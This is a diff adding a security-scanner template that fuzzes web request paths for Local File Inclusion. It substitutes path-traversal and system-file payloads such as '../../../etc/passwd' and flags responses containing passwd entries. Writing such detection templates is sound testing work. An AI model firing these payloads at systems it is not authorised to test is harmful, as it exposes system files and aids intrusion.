@@ -1,0 +1,43 @@
+id: fuzz-lfi-custom
+
+info:
+  name: Custom Local File Inclusion (LFI) Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template tests for Local File Inclusion (LFI) vulnerabilities using a specified filename pattern.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      lfi:
+        - "/etc/passwd"
+        - "/var/log/syslog"
+        - "/etc/hosts"
+        - "../../../etc/passwd"  # Example path traversal to check LFI
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: path
+        type: replace
+        mode: single
+        fuzz:
+          - "{{lfi}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"  # Common pattern found in /etc/passwd file
+          - "bin:"   # Another entry you might find in /etc/passwd
+          - "www-data:"  # Common user in /etc/passwd
+
+      - type: status
+        status:
+          - 200  # In a successful LFI case, the server should return a 200 status
